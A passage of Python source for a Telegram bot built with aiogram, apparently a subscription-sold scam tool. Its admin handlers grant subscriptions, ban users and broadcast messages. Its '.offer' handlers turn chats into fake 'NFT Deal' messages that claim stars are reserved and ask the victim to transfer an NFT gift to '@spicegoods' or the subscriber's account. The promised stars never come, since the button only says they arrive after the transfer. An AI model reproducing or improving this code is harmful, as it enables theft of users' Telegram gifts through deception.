    action, uid = parts[1], int(parts[2])
    if action == "sub":
        cur_users.execute("UPDATE users SET sub_end=9999999999, sub_notified=0 WHERE user_id=?", (uid,))
        await log_sub_grant(uid, "Навсегда")
        await callback.answer("✅ Выдано!")
    elif action == "unsub":
        cur_users.execute("UPDATE users SET sub_end=0 WHERE user_id=?", (uid,))
        await callback.answer("✅ Забрано!")
    elif action == "ban":
        cur_users.execute("SELECT is_banned FROM users WHERE user_id=?", (uid,))
        new_status = 0 if cur_users.fetchone()[0] == 1 else 1
        cur_users.execute("UPDATE users SET is_banned=? WHERE user_id=?", (new_status, uid))
        await callback.answer(f"✅ {'Забанен' if new_status else 'Разбанен'}!")
    conn_users.commit()

@dp.callback_query(F.data == "admin_give_sub")
async def admin_give_sub(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("Отправьте <b>ID юзера</b>:")
    await state.set_state(AdminStates.waiting_sub_user)

@dp.message(AdminStates.waiting_sub_user)
async def process_give_sub(message: types.Message, state: FSMContext):
    if not message.text.isdigit(): return
    uid = int(message.text)
    cur_users.execute("UPDATE users SET sub_end=9999999999, sub_notified=0 WHERE user_id=?", (uid,))
    conn_users.commit()
    await log_sub_grant(uid, "Навсегда")
    await message.answer("✅ Подписка выдана!")
    await state.clear()

@dp.callback_query(F.data == "admin_broadcast")
async def admin_broadcast(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("Отправьте сообщение для рассылки (поддерживается всё):")
    await state.set_state(AdminStates.waiting_broadcast)

@dp.message(AdminStates.waiting_broadcast)
async def process_broadcast(message: types.Message, state: FSMContext):
    await state.clear()
    cur_users.execute("SELECT user_id FROM users")
    users = cur_users.fetchall()
    await message.answer(f"🚀 Отправка {len(users)} юзерам...")
    s, f = 0, 0
    for (uid,) in users:
        try: await bot.copy_message(chat_id=uid, from_chat_id=message.chat.id, message_id=message.message_id); s += 1
        except: f += 1
        await asyncio.sleep(0.05)
    await message.answer(f"✅ Успешно: {s}, Ошибок: {f}")

@dp.callback_query(F.data == "admin_add_channel")
async def admin_add_channel(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("Отправьте ID канала (-100...) или @юзернейм:")
    await state.set_state(AdminStates.waiting_channel_id)

@dp.message(AdminStates.waiting_channel_id)
async def process_ch_id(message: types.Message, state: FSMContext):
    await state.update_data(ch_id=message.text.strip())
    await message.answer("Теперь ссылку на канал (https://t.me/...):")
    await state.set_state(AdminStates.waiting_channel_link)

@dp.message(AdminStates.waiting_channel_link)
async def process_ch_link(message: types.Message, state: FSMContext):
    data = await state.get_data()
    cur.execute("INSERT OR REPLACE INTO channels VALUES (?, ?)", (data['ch_id'], message.text.strip()))
    conn.commit()
    await message.answer("✅ Канал добавлен!")
    await state.clear()

@dp.callback_query(F.data == "admin_list_admins")
async def admin_list_admins(callback: types.CallbackQuery):
    if callback.from_user.id != MAIN_ADMIN_ID: return
    cur.execute("SELECT user_id FROM admins")
    admins = cur.fetchall()
    text = "👑 <b>Админы:</b>\n\n" + "\n".join([f"<code>{a[0]}</code>" for a in admins])
    await callback.message.edit_text(text, parse_mode="HTML")

# --- ОФФЕРНЫЕ КНОПКИ ---
@dp.business_message(F.text)
async def handle_business_text(message: types.Message):
    if message.text and message.text.strip().lower().startswith(".offer"):
        await handle_offer_command(message)

@dp.message(F.text)
async def handle_direct_text(message: types.Message):
    if message.text and message.text.strip().lower().startswith(".offer"):
        await handle_offer_command(message)

@dp.callback_query(F.data == "accept_offer")
async def process_accept(callback: types.CallbackQuery):
    offer_data = _active_offers.get(str(callback.message.message_id))
    if not offer_data or callback.from_user.id == offer_data["sender_id"]:
        await callback.answer("Ошибка.", show_alert=True)
        return
    cur_users.execute("UPDATE users SET deals_successful = deals_successful + 1 WHERE user_id = ?", (offer_data["sender_id"],))
    conn_users.commit()
    _, _, sender_holder, sender_sub_end, sender_style = get_user_settings(offer_data["sender_id"])
    target = "@spicegoods" if sender_sub_end <= time.time() else (sender_holder or "@spicegoods")
    curr_symbol = "⭐️" if offer_data["curr"] == 'stars' else "💎 GRAM"
    preview = LinkPreviewOptions(is_disabled=False, prefer_large_media=True, show_above_text=True, url=offer_data['nft_url'])
    if sender_style == 'old':
        text = f"💎Передайте подарок <a href=\"{offer_data['nft_url']}\">{offer_data['nft_title']}</a> пользователю {target}, звёзды поступят на баланс сразу же."
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Передать", url=offer_data['nft_url']), InlineKeyboardButton(text="Получить звезды", callback_data="recv_stars")]])
    else:
        deal_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        text = f"<b>NFT Deal | #TG-{deal_id}</b>\n\nЗарезервировано: {offer_data['count']:,} {curr_symbol}\n\nПередайте подарок {offer_data['nft_title']} покупателю \"{target}\" через «Передать NFT».\n\n⌛️ Резерв: 24 часа."
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Передать NFT", url=offer_data['nft_url'])]])
    try: await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML", link_preview_options=preview)
    except Exception: pass
    await callback.answer("Вы приняли предложение!")

@dp.callback_query(F.data == "recv_stars")
async def recv_stars(callback: types.CallbackQuery):
    await callback.answer("Звезды придут после передачи NFT.", show_alert=True)

@dp.callback_query(F.data == "decline_offer")
async def process_decline(callback: types.CallbackQuery):
    try: await callback.message.edit_text("❌ Вы отклонили предложение.")
    except Exception: pass
    await callback.answer()

# --- ФОН ---
async def background_watcher():
    while True:
        now = int(time.time())
        cur_users.execute("SELECT user_id FROM users WHERE sub_end > ? AND sub_end <= ? AND sub_notified = 0 AND sub_end != 9999999999", (now, now + 86400))
        for (uid,) in cur_users.fetchall():
            try:
                await bot.send_message(uid, "⚠️ <b>Ваша подписка истекает через 24 часа!</b>", parse_mode="HTML")
                cur_users.execute("UPDATE users SET sub_notified = 1 WHERE user_id = ?", (uid,))
                conn_users.commit()
            except Exception: pass
        await asyncio.sleep(3600)

async def main():
    logging.basicConfig(level=logging.INFO)
    await bot.delete_webhook(drop_pending_updates=True)
    asyncio.create_task(background_watcher())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
